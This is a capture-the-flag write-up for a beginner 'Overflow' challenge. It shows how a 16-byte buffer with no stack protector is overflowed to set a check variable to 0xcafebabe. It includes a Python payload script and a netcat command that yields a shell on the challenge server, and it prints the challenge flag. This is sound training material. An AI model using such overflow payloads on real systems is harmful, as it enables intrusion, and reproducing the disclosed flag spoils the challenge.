# Overflow

Points: 50

We can see that the `name` array is defined to have a length of 16 bytes. The
`check` variable is defined before it, and the problem was compiled without a
stack protector. This means that we can overflow `name` to set the value of
`check`.

We can write a small Python script to create the payload:

```python
c1 = "1234567890123456"
c3 = "\xbe\xba\xfe\xca" # Little endian byte ordering

load = c1 + c3

with open('load', 'w') as load_file:
    load_file.write(load)
```

This will create a string with 16 ASCII characters followed by 4-bytes that
equal `0xcafebabe`. Executing the python script saves the payload to a file
named `load`. We can then send this payload to the executable by doing `cat
load - | nc pwn.osucyber.club 13373`. After pressing enter, we now have access
to a shell. To get the flag, we can do `cat flag`, which reveals
`osuctf{expl01t1ng_5t4ck_l4y0ut}`
